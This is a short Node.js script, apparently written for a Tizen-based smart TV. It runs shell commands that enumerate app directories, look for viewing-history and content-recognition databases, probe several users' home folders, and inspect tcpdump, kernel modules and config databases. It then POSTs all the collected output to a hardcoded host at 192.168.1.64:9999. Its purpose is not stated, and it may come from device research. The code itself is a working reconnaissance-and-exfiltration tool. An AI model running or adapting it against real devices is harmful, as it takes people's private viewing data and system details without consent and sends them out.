"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}

function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 45000 }).slice(0, cap || 12000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();
out.nsf = sh("ls -laR /opt/usr/apps/NSF 2>&1 | head -60");
out.view_find = sh("find /opt -iname '*watch*' -o -iname '*viewing*' -o -iname '*acrd*' -o -iname '*acr_*.db*' -o -iname '*history*.db*' 2>/dev/null | head -25");
out.acr_users = sh("for u in owner alice bob carol; do echo USER:$u; ls -laR /opt/usr/home/$u/apps_rw/org.tizen.acr-service-app 2>&1 | head -15; done");
post("/final1", out);

var out2 = {};
out2.tcpdump = sh("/usr/sbin/vd-tcpdump -h 2>&1 | head -8; echo ===; ls -la /usr/sbin/vd-tcpdump; echo ===; /usr/sbin/vd-tcpdump -D 2>&1 | head -8");
out2.ntk_ko = sh("ls -la /usr/lib/modules/4.1.10/kernel/soc/ 2>&1 | head -15");
out2.buxton = sh("find /opt /usr -path '*buxton*' -name '*.db*' 2>/dev/null | head -10; echo ===; ls /opt/var/buxton 2>/dev/null | head -10");
post("/final2", out2);
